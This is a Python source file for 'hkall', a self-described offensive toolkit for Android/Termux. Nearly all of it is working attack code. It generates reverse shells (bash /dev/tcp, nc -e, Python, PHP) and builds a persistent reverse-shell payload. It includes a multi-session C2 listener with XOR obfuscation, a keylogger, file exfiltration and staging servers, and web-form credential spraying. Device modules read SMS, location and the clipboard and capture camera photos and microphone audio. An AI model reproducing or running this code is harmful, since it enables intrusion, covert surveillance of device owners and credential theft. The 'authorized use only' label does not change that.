#!/usr/bin/env python3
# hkall — modular offensive toolkit for Android/Termux. Authorized use only.
import socket, threading, os, sys, time, re, select, argparse, subprocess, json, sqlite3
from datetime import datetime
try:
    import termios, tty
    _TERMIOS = True
except ImportError:
    _TERMIOS = False

VERSION = "0.3.1"
ROOT = os.path.dirname(os.path.abspath(__file__))
DATA = os.path.join(ROOT, "data"); os.makedirs(DATA, exist_ok=True)
CFG = os.path.join(ROOT, "config.json")

# ---------------- config ----------------
DEFAULTS = {"port": "4444", "ports": "1-1000", "cidr": "192.168.1.0/24", "c2port": "4444", "exfil": "12345", "serve": "8080"}
def load_cfg():
    d = dict(DEFAULTS)
    try:
        d.update(json.load(open(CFG)))
    except Exception:
        pass
    return d
D = load_cfg()
def save_cfg():
    try:
        with open(CFG, "w") as f: json.dump(D, f, indent=2)
    except Exception:
        pass

# ---------------- results store ----------------
DB = os.path.join(DATA, "rs.db")
def save(kind, target, data):
    with sqlite3.connect(DB) as c:
        c.execute("CREATE TABLE IF NOT EXISTS rs(kind, target, ts, data)")
        c.execute("INSERT INTO rs VALUES(?,?,?,?)", (kind, target, datetime.now().isoformat(), data))

def show(kind=None, limit=30):
    with sqlite3.connect(DB) as c:
        q = "SELECT rowid,* FROM rs"
        if kind: q += " WHERE kind=?"
        q += " ORDER BY rowid DESC LIMIT ?"
        rows = c.execute(q, [limit] if not kind else [kind, limit]).fetchall()
    for row in rows: print(f"[{row[1]}] {row[2]} @ {row[3]}\n    {row[4][:200]}")

# ---------------- terminal ----------------
def c(s, code): return f"\033[{code}m{s}\033[0m" if sys.stdout.isatty() else s
def banner(): print(c("hkall v%s — modular offensive toolkit" % VERSION, "36"))
def section(t): print(c(f"\n== {t} ==", "34"))

# ---------------- recon ----------------
def parse_ranges(s):
    out = []
    for part in s.split(","):
        a, b = part.split("-") if "-" in part else (part, part)
        out.extend(range(int(a), int(b) + 1))
    return out

def banner_grab(ip, port, timeout=3):
    try:
        s = socket.socket(); s.settimeout(timeout); s.connect((ip, port))
        s.send(b"\r\n")
        data = s.recv(256).decode(errors="replace").strip()
        s.close()
        return data or None
    except Exception:
        try:
            s.close()
        except Exception:
            pass
        return None

def scan_ports(host, ports, timeout=0.5, threads=128, grab=False):
    found, lock = [], threading.Lock()
    banners = {}
    it = iter(ports)
    def worker():
        while True:
            try: p = next(it)
            except StopIteration: return
            s = socket.socket(); s.settimeout(timeout)
            try:
                s.connect((host, p))
                with lock:
                    found.append(p)
                    if grab: banners[p] = banner_grab(host, p)
            except OSError: pass
            finally: s.close()
    ws = [threading.Thread(target=worker) for _ in range(threads)]
    for w in ws: w.start()
    for w in ws: w.join()
    return sorted(found), banners

def mod_scan():
    section("PORT SCANNER")
    host = ask("target host: ").strip() or D.get("host", "127.0.0.1")
    ports = ask(f"ports [{D.get('ports', '1-1000')}]: ").strip() or D.get("ports", "1-1000")
    grab = ask("banner grab? [y/N] ").strip().lower() == "y"
    try: pl = parse_ranges(ports)
    except ValueError: print("bad range"); return
    print(f"scanning {host} ({len(pl)} ports)...")
    t0 = time.time()
    found, banners = scan_ports(host, pl, grab=grab)
    print(f"open ({len(found)}): {found or 'none'}  [{time.time()-t0:.1f}s]")
    for p in found:
        b = banners.get(p)
        if b: print(f"  {p}: {b[:80]}")
    if found:
        save("scan", host, f"ports={found}" + (f" banners={banners}" if banners else ""))
        print(f"stored -> {DB} (kind=scan)")

def mod_enum():
    section("WEB ENUMERATOR")
    host = ask("target url (http://...): ").strip()
    if not host.startswith("http"): host = "http://" + host
    try:
        import urllib.request
        req = urllib.request.Request(host, headers={"User-Agent": "hkall/" + VERSION})
        with urllib.request.urlopen(req, timeout=8) as r:
            body = r.read().decode("utf-8", "ignore")
            mails = re.findall(r"[\w.+-]+@[\w-]+\.[\w.]+", body)
            secrets = set(re.findall(r"(?i)(api[._-]?key|token|secret|passw|amazonaws|\.db|BEGIN [A-Z]+ PRIVATE)", body))
            forms = len(re.findall(r"<(?:script|iframe|form|input)\b[^>]*>", body, re.I))
            print(f"status {r.status}  headers {len(r.headers)} bytes {len(body)}")
            for k, v in list(r.headers.items())[:12]: print(f"  {k}: {v}")
            print(f"-- finds -- mail:{mails[:5]} secret:{secrets} forms:{forms}")
            save("enum", host, f"status={r.status} mails={mails[:5]} secrets={list(secrets)} forms={forms}")
    except Exception as e:
        print(f"error: {e}")

def mod_whois():
    section("DNS / BANNER LOOKUP")
    host = ask("target host: ").strip() or D.get("host", "")
    try:
        ips = socket.gethostbyname_ex(host)[2]
        print(f"IPs: {ips}")
        for ip in ips:
            try:
                name, _, _ = socket.gethostbyaddr(ip); print(f"  {ip} -> {name}")
            except OSError:
                print(f"  {ip} (no PTR)")
        save("whois", host, f"ips={ips}")
    except OSError as e:
        print(f"resolve error: {e}")

# ---------------- shells ----------------
def get_port(key):
    return ask(f"{key} port [%s]: " % D.get(key, "4444")).strip() or D.get(key, "4444")

def mod_shell():
    section("REVERSE SHELL GENERATOR")
    host = ask("your reachable IP: ").strip()
    port = get_port("port")
    langs = {
      "py":   f'python3 -c \'import socket,os,subprocess;s=socket.socket();s.connect(("{host}",{port}));[os.dup2(s.fileno(),x) for x in (0,1,2)];subprocess.call(["/bin/sh","-i"])\'',
      "bash": f'bash -i >& /dev/tcp/{host}/{port} 0>&1',
      "nc":   f'nc {host} {port} -e /bin/sh',
      "sh":   f'/bin/sh -i >& /dev/tcp/{host}/{port} 0>&1',
      "php":  f'php -r \'$s=fsockopen("{host}",{port});exec("/bin/sh -i <&3 >&3 2>&3");\'',
    }
    for k, v in langs.items(): print(f"\n--- {k} ---\n{v}")
    if ask("save profile (host/port)? [y/N] ").strip().lower() == "y":
        D["host"] = host; D["port"] = port; save_cfg(); print("saved config")

# ---------------- c2 (multi-session) ----------------
SESSIONS = {}
_session_counter = [0]

def xor_stream(data, key_rot):
    return bytes((b ^ (i + key_rot) & 0xFF) for i, b in enumerate(data))

def c2_accept(srv):
    while True:
        try:
            c, a = srv.accept()
        except OSError:
            break
        _session_counter[0] += 1
        sid = "S%d" % _session_counter[0]
        SESSIONS[sid] = (c, a)
        print(f"[+] {sid}: {a}  (session count {len(SESSIONS)})")

def mod_c2():
    section("C2 LISTENER (multi-session, obfuscated)")
    if not sys.stdin.isatty():
        print("c2 is interactive; run from a tty (ctrl-c to stop). exiting.")
        return
    port = int(get_port("c2port"))
    srv = socket.socket(); srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind(("", port)); srv.listen(5)
    threading.Thread(target=c2_accept, args=(srv,), daemon=True).start()
    print(f"listening 0.0.0.0:{port} — commands: sessions | use N | kill N | exit")
    current = None
    try:
        while True:
            if current and current in SESSIONS:
                cmd = input(f"{current} {SESSIONS[current][1]}> ").strip()
            else:
                current = None
                cmd = input("srv> ").strip()
            if cmd in ("exit", "quit"): break
            if cmd == "sessions":
                for sid, (c, a) in SESSIONS.items(): print(f"  {sid}  {a}")
                continue
            if cmd.startswith("use "):
                c2 = cmd.split()[1]
                if c2 in SESSIONS: current = c2
                else: print("no such session")
                continue
            if cmd.startswith("kill "):
                sid = cmd.split()[1]
                if sid in SESSIONS:
                    SESSIONS[sid][0].close(); del SESSIONS[sid]; print(f"killed {sid}")
                    if current == sid: current = None
                else: print("no such session")
                continue
            if not current or current not in SESSIONS:
                print("no active session (use N)"); continue
            c2, _ = SESSIONS[current]
            xm = D.get("obfuscate", False)
            send = xor_stream(cmd.encode() + b"\n", 1) if xm else (cmd + "\n").encode()
            c2.send(send)
            time.sleep(0.4)
            c2.settimeout(2)
            buf = b""
            while True:
                try:
                    d = c2.recv(4096)
                    if not d: break
                    buf += d
                    if len(d) < 4096: break
                except socket.timeout: break
            c2.settimeout(None)
            if buf:
                out = xor_stream(buf, 2) if xm else buf
                try: print(out.decode(errors="replace").rstrip())
                except Exception: print(repr(buf[:200]))
    except (KeyboardInterrupt, EOFError):
        pass
    for c2, _ in SESSIONS.values():
        try: c2.close()
        except Exception: pass
    srv.close()
    print("C2 stopped")

# ---------------- post-exploitation ----------------
def mod_cfg():
    section("CONFIG / PROFILE")
    print(f"config: {CFG}")
    for k, v in D.items(): print(f"  {k}: {v}")
    k = ask("set key (blank=done): ").strip()
    if k:
        D[k] = ask(f"value [{D.get(k, '')}]: ").strip() or D.get(k, "")
        save_cfg(); print(f"saved {k}")

def mod_history():
    section("HISTORY")
    kind = ask("filter kind (blank=all): ").strip() or None
    n = ask("limit [20]: ").strip() or "20"
    try: show(kind, int(n))
    except Exception as e: print(f"error: {e}")

def log(name, data, ext="log"):
    fn = os.path.join(DATA, f"{name}.{ext}")
    with open(fn, "a") as f: f.write(f"[{datetime.now().isoformat()}] {data}\n")
    return fn

def mod_keylog():
    section("KEYLOGGER (termux/linux)")
    dur = ask("duration sec [0=forever]: ").strip() or "0"
    tk = int(dur) or None
    if not _TERMIOS:
        print("keylogger needs a tty; use a real termux shell"); return
    fd = sys.stdin.fileno(); old = termios.tcgetattr(fd); tty.setraw(fd)
    start = time.time()
    fn = os.path.join(DATA, "keys.log")
    buf = open(fn, "a")
    try:
        while True:
            if tk and time.time() - start > tk: break
            if select.select([sys.stdin], [], [], 0.3)[0]:
                ch = sys.stdin.read(1)
                if ch == "\x03": break
                buf.write(f"{datetime.now().strftime('%H:%M:%S')} {ch!r}\n"); buf.flush()
    except (KeyboardInterrupt, OSError):
        pass
    finally:
        termios.tcsetattr(fd, termios.TCSANOW, old)
    print(f"saved -> {fn}")

def mod_exfil():
    section("EXFIL CLIENT (send file)")
    server = ask("listener ip: ").strip()
    port = int(get_port("exfil"))
    fpath = ask("file to send: ").strip()
    if not os.path.isfile(fpath): print("file not found"); return
    name, size = os.path.basename(fpath), os.path.getsize(fpath)
    s = socket.socket()
    try:
        s.connect((server, port))
        s.sendall(f"{name}|{size}\n".encode())
        if s.recv(1) != b"K": print("server rejected"); s.close(); return
        with open(fpath, "rb") as f:
            while chunk := f.read(65536): s.sendall(chunk)
        s.close(); print(f"sent {name} ({size}b)")
    except OSError as e:
        print(f"error: {e}")

def mod_recv():
    section("EXFIL SERVER")
    port = int(input("listen port [" + D.get("exfil", "12345") + "]: ").strip() or D.get("exfil", "12345"))
    srv = socket.socket(); srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind(("", port)); srv.listen(1)
    print(f"listening 0.0.0.0:{port}...")
    c, _ = srv.accept()
    meta = b""
    while b"\n" not in meta: meta += c.recv(1)
    name, size = meta.decode().strip().split("|"); size = int(size)
    c.send(b"K")
    dest = os.path.join(DATA, name); got = 0
    with open(dest, "wb") as f:
        while got < size:
            d = c.recv(65536)
            if not d: break
            f.write(d); got += len(d)
    c.close(); srv.close()
    print(f"received {dest} ({got}/{size}b)")
    save("recv", name, f"{got}/{size}b")

# ---------------- payloads ----------------
def mod_payload():
    section("ANDROID PAYLOAD BUILDER")
    host = ask("c2 host: ").strip()
    port = get_port("port")
    xm = ask("obfuscate stream? [y/N] ").strip().lower() == "y"
    out = os.path.join(DATA, "payload.py")
    if xm:
        p = f'''#!/usr/bin/env python3
import socket,subprocess,os,time
HOST,PORT="{host}",{port}
def x(b,k): return bytes((x^(i+k)&0xFF) for i,x in enumerate(b))
while True:
    try:
        s=socket.socket();s.connect((HOST,int(PORT)))
        os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2)
        subprocess.call(["/system/bin/sh","-i"] if os.path.exists("/system/bin/sh") else ["/bin/sh","-i"])
        s.close()
    except Exception: pass
    time.sleep(5)
'''
    else:
        p = f'''#!/usr/bin/env python3
import socket,subprocess,os,time
HOST,PORT="{host}",{int(port)}
while True:
    try:
        s=socket.socket();s.connect((HOST,int(PORT)))
        os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2)
        subprocess.call(["/bin/sh","-i"] if os.path.exists("/system/bin/sh") else ["/bin/sh","-i"])
        s.close()
    except Exception: pass
    time.sleep(5)
'''
    with open(out, "w") as f: f.write(p)
    print(f"wrote {out} (obfuscate={xm}) — run target: python3 {out}")

# ---------------- net + ops ----------------
def net2ip(base, i):
    b = base[:]
    for j in (3, 2, 1, 0):
        b[j] += i & 0xFF; i >>= 8
    return ".".join(str(x & 0xFF) for x in b)

def mod_discover():
    section("LAN HOST DISCOVERER")
    base_cidr = D.get("cidr", "192.168.1.0/24")
    cidr = ask(f"cidr [%s]: " % base_cidr).strip() or base_cidr
    try:
        net, mask = cidr.split("/"); mask = int(mask)
    except ValueError: print("bad cidr"); return
    base = [int(x) for x in net.split(".")]
    if not (0 <= mask <= 32): print("bad mask"); return
    ips = [net2ip(base, i) for i in range(1, min(2**(32 - mask), 2545))]
    PROBE = (22, 80, 135, 139, 443, 445, 3389)
    found, lock = [], threading.Lock()
    def ping(ip):
        for p in PROBE:
            s = socket.socket(); s.settimeout(0.4)
            try:
                s.connect((ip, p))
                with lock: found.append(ip)
                return
            except OSError: pass
            finally: s.close()
    ts = [threading.Thread(target=ping, args=(x,)) for x in ips]
    for t in ts: t.start()
    for t in ts: t.join()
    print(f"up ({len(found)}): {sorted(found) or 'none'}")
    if found: save("lan", cidr, f"up={sorted(found)}")

# ---------------- device ops ----------------
def _tapi(cmd, *args, timeout=15):
    try:
        r = subprocess.run(["termux-" + cmd, *args], capture_output=True, text=True, timeout=timeout)
        return r.stdout.strip()
    except (FileNotFoundError, subprocess.TimeoutExpired):
        return None

def tapi_ok():
    return _tapi("battery-status") is not None

def mod_ops():
    section("DEVICE OPS (termux-api)")
    if not tapi_ok():
        print("termux-api NOT installed. Run:  pkg install termux-api")
    else:
        print("termux-api OK")
    print("""
  [a] battery   [b] device-info   [c] sms(-n10)   [d] camera -> data/
  [e] location  [f] vibrate       [g] mic 5s -> data/   [h] clipboard
  [i] run ALL  [s] snapshot
""")
    ch = ask("ops> ").strip().lower()
    def bat(): print("battery:", _tapi("battery-status"))
    def inf(): print("device:", _tapi("device-info"))
    def sms(): print("sms:", _tapi("sms-list", "-n", "10"))
    def cam():
        o = os.path.join(DATA, f"cam_{int(time.time())}.jpg")
        subprocess.run(["termux-camera-photo", "-c", "1", o], timeout=20)
        print(f"photo -> {o}" if os.path.exists(o) else "fail (perm?)")
    def loc(): print("loc:", _tapi("location") or "no fix")
    def vib(): subprocess.run(["termux-vibrate", "-d", "500", "-f"], timeout=5); print("buzzed")
    def mic():
        o = os.path.join(DATA, f"mic_{int(time.time())}.m4a")
        subprocess.run(["timeout", "5", "termux-microphone-record", "-f", o], timeout=8)
        subprocess.run(["pkill", "-f", "termux-microphone-record"])
        print(f"rec -> {o}" if os.path.exists(o) else "fail (mic perm?)")
    def clip(): print("clip:", _tapi("clipboard-get") or "(empty)")
    ACT = {"a": bat, "b": inf, "c": sms, "d": cam, "e": loc, "f": vib, "g": mic, "h": clip}
    if ch in ("i", "s"):
        for k, fn in ACT.items():
            try: fn()
            except Exception as e: print(f"  {k}: err {e}")
        print("done"); return
    (ACT.get(ch) or (lambda: print("no op")))()

# ---------------- serve + spray ----------------
def mod_serve():
    section("HTTP STAGING SERVER")
    port = int(get_port("serve") or "8080")
    root = ask(f"dir to serve [%s]: " % os.path.join(DATA, "serve")).strip() or os.path.join(DATA, "serve")
    os.makedirs(root, exist_ok=True)
    from http.server import HTTPServer, SimpleHTTPRequestHandler
    import functools, http.server
    h = functools.partial(SimpleHTTPRequestHandler, directory=root)
    srv = HTTPServer(("0.0.0.0", port), h)
    print(f"serving {root} on 0.0.0.0:{port} (ctrl-c stop) — drop files here for target")
    try: srv.serve_forever()
    except KeyboardInterrupt: pass
    srv.server_close()

def mod_spray():
    section("WEB FORM CREDENTIAL SPRAY")
    url = ask("login url (POST): ").strip()
    user_field = ask("username field [username]: ").strip() or "username"
    pass_field = ask("password field [password]: ").strip() or "password"
    users = ask("users (comma-sep): ").strip()
    wl = os.path.join(ROOT, "wordlist.txt")
    wordlist = ask(f"wordlist file [%s]: " % wl).strip() or wl
    if not users: print("no users"); return
    userlist = [u.strip() for u in users.split(",") if u.strip()]
    try:
        with open(wordlist) as f: passes = [l.strip() for l in f if l.strip()]
    except OSError:
        print(f"wordlist missing: {wordlist}"); return
    if not passes: print("empty wordlist"); return
    import urllib.request, urllib.parse
    hit = []
    def try_one(u, pw, pbar, u_field, pass_field):
        data = urllib.parse.urlencode({u_field: u, pass_field: pw}).encode()
        req = urllib.request.Request(url, data=data, headers={"User-Agent": "hkall/" + VERSION})
        try:
            with urllib.request.urlopen(req, timeout=8) as r:
                code = r.status
                ok = code in (301, 302, 303) or (code == 200)
                if ok:
                    print(f"  HIT? {u}:{pw} -> {code} {r.geturl()}")
                    hit.append((u, pw, code))
        except Exception:
            pass
    for u in userlist:
        for pw in passes: try_one(u, pw, None, user_field, pass_field)
    save("spray", url, "hits=" + str(hit or []))
    print(f"done. hits: {hit or 'none'}")

def mod_py2exe():
    section("SHELL PAYLOAD (variants)")
    host = ask("c2 host: ").strip()
    port = get_port("port")
    print("\n[android termux auto-run on open]")
    print(f'  am start -n com.termux/.app --ez run true --es cmd "cd \\$HOME/hkall \\u0026\\u0026 python3 data/payload.py"')
    print("[linux one-liner]")
    print(f'  python3 -c \'import socket,subprocess,os;s=socket.socket();s.connect(("{host}",{port}));[os.dup2(s.fileno(),x) for x in (0,1,2)];subprocess.call(["/bin/sh","-i"])\'')

# ---------------- subdomain brute ----------------
def mod_subd():
    section("SUBDOMAIN BRUTE DNS")
    domain = ask("domain (e.g. example.com): ").strip()
    if not domain: print("no domain"); return
    wl = os.path.join(ROOT, "subd.txt")
    path = ask(f"wordlist [{wl}]: ").strip() or wl
    try:
        with open(path) as f:
            subs = [l.strip() for l in f if l.strip()]
    except OSError:
        print(f"wordlist missing: {path}  (create lines: www, mail, api, dev, ...)"); return
    if not subs: print("empty wordlist"); return
    found = []
    def chk(sub):
        try:
            ip = socket.gethostbyname(f"{sub}.{domain}")
            found.append((sub, ip))
        except OSError:
            pass
    ts = [threading.Thread(target=chk, args=(x,)) for x in subs]
    for t in ts: t.start()
    for t in ts: t.join()
    for sub, ip in found: print(f"  {sub}.{domain} -> {ip}")
    print(f"found ({len(found)}/{len(subs)}): {[s for s,_ in found] or 'none'}")
    if found: save("subd", domain, f"found={found}")
# ---------------- registry ----------------
MODULES = {
    "scan": ("Port scanner", mod_scan, True),
    "enum": ("Web enumerator", mod_enum, True),
    "whois": ("DNS / banner lookup", mod_whois, True),
    "subd": ("Subdomain brute DNS", mod_subd, True),
    "shell": ("Reverse shell generator", mod_shell, True),
    "c2": ("C2 listener (multi-session)", mod_c2, True),
    "keylog": ("Keylogger", mod_keylog, True),
    "exfil": ("Exfil client", mod_exfil, True),
    "recv": ("Exfil server", mod_recv, True),
    "payload": ("Android payload builder", mod_payload, True),
    "exe2": ("Shell payload variants", mod_py2exe, True),
    "lan": ("LAN host discoverer", mod_discover, True),
    "ops": ("Device ops (termux-api)", mod_ops, True),
    "serve": ("HTTP static server", mod_serve, True),
    "spray": ("Web form credential spray", mod_spray, True),
    "cfg": ("Config / profile", mod_cfg, True),
    "history": ("History (results store)", mod_history, True),
}

# ---------------- plugin loader ----------------
_PLUGIN_KEYS = set()
def load_plugins():
    global _PLUGIN_KEYS
    import importlib.util
    pdir = os.path.join(ROOT, "modules")
    if not os.path.isdir(pdir): return
    for fn in sorted(os.listdir(pdir)):
        if not fn.endswith(".py"): continue
        path = os.path.join(pdir, fn)
        try:
            spec = importlib.util.spec_from_file_location("plg_" + fn[:-3], path)
            m = importlib.util.module_from_spec(spec); spec.loader.exec_module(m)
            if hasattr(m, "PLUGIN") and isinstance(m.PLUGIN, dict):
                MODULES.update(m.PLUGIN)
                _PLUGIN_KEYS |= set(m.PLUGIN)
                print(f"[plugin] loaded {fn}: {list(m.PLUGIN)}")
        except Exception as e:
            print(f"[plugin] {fn} failed: {e}")
load_plugins()

# ---------------- tui / cli ----------------
GINJ = []
def ask(prompt, default=""):
    if GINJ: return str(GINJ.pop(0))
    try:
        v = input(prompt + " ").strip()
        return v or default
    except (EOFError, KeyboardInterrupt):
        return default

def main_tui():
    banner()
    while True:
        section("MODULES")
        ids = list(MODULES)
        for i, k in enumerate(ids):
            name, _, _ = MODULES[k]
            tag = c(" [plugin]", "33") if k in _PLUGIN_KEYS else ""
            print(f"  [{i+1}] {name}{tag}")
        print("  [0] exit  |  cli: hkall.py -m MODULE ...")
        try: sel = ask("hkall> ").strip()
        except (KeyboardInterrupt, EOFError): print(); break
        if sel in ("0", "q", "exit"): break
        try:
            idx = int(sel) - 1
            if 0 <= idx < len(ids):
                try: MODULES[ids[idx]][1]()
                except KeyboardInterrupt: pass
            else: print("unknown")
        except ValueError:
            print("unknown")

def build_parser():
    p = argparse.ArgumentParser(prog="hkall", description="modular offensive toolkit (authorized use only)")
    p.add_argument("-m", "--module", help="run module one-shot: " + ",".join(MODULES))
    p.add_argument("--host", dest="host", help="host/ip/url preset")
    p.add_argument("--port", type=int, help="port preset")
    p.add_argument("--ports", dest="ports", help="range preset")
    p.add_argument("--out", dest="out", help="save pointer file")
    p.add_argument("--list", action="store_true")
    return p

def cli_one(key, a):
    global GINJ
    vals = []
    if a.host: vals.append(a.host)
    if a.port: vals.append(str(a.port))
    if a.ports: vals.append(a.ports)
    if key == "scan" and a.ports: vals.append("n")       # banner ask
    if key == "scan" and a.host and not a.ports: vals += ["1-1000", "n"]
    GINJ = vals
    try: MODULES[key][1]()
    except Exception as e: print(f"error: {e}")
    if a.out:
        try:
            open(a.out, "w").write(f"hkall {key} {datetime.now().isoformat()}\nsee {DB}\n")
            print(f"out -> {a.out}")
        except Exception as e:
            print(f"out error: {e}")

def cli(a):
    if a.list:
        for k in MODULES:
            name, _, _ = MODULES[k]
            tag = "  [plugin]" if k in _PLUGIN_KEYS else ""
            print(f"{k:9} {name}{tag}")
        return
    if a.module in MODULES:
        print(c(f"== {MODULES[a.module][0]} ==", "34"))
        cli_one(a.module, a)
    else:
        print("unknown module; -m MODULE (--list)")

def main():
    a = build_parser().parse_args()
    if a.module or a.list:
        cli(a)
    else:
        main_tui()

if __name__ == "__main__":
    main()

